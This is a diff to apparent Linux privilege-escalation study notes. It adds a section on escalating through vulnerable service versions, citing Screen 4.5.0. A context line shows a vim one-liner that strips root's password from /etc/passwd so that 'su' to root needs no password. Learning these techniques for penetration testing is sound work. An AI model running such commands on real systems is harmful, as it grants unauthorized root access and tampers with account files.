@@ -8,6 +8,7 @@
     - [Sudo Rights Abuse](#sudo-rights-abuse)
     - [Privileged Groups](#privileged-groups)
     - [Capabilities](#capabilities)
+- [Service-based Privilege Escalation]()
 
 
 check [gtfobins](https://gtfobins.github.io/)
@@ -156,3 +157,12 @@ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
 
 # Now, we can see that the x in that line is gone, which means that we can use the command su to log in as root without being asked for the password.
 ```
+
+# Service-based Privilege Escalation
+
+## Vulnerable Services
+
+check for avaialble services and binaries versions to see if there is available exploits 
+
+#### EX: 
+Screen. Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.
